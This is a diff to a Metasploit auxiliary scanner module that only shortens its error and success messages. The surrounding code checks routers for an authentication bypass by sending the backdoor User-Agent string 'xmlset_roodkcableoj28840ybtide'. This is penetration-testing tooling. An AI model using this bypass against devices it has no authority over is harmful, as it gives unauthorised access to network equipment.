@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi({ 'uri' => '/' })
     rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+      vprint_error("Failed to connect to the web server")
       return false
     end
 
@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
         'agent' => 'xmlset_roodkcableoj28840ybtide'
       })
     rescue ::Rex::ConnectionError
-      vprint_error("#{ip}:#{rport} - Failed to connect to the web server")
+      vprint_error("Failed to connect to the web server")
       return
     end
 
@@ -72,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
     # not sure if this matches on other devices
     # TODO: Testing on other devices
     if res and res.code == 200 and res.headers["Content-length"] != 0 and res.body =~ /Home\/bsc_internet\.htm/
-      print_good("#{ip}:#{rport} - Vulnerable for authentication bypass via User-Agent Header \"xmlset_roodkcableoj28840ybtide\"")
+      print_good("Vulnerable for authentication bypass via User-Agent Header \"xmlset_roodkcableoj28840ybtide\"")
     end
   end
 end
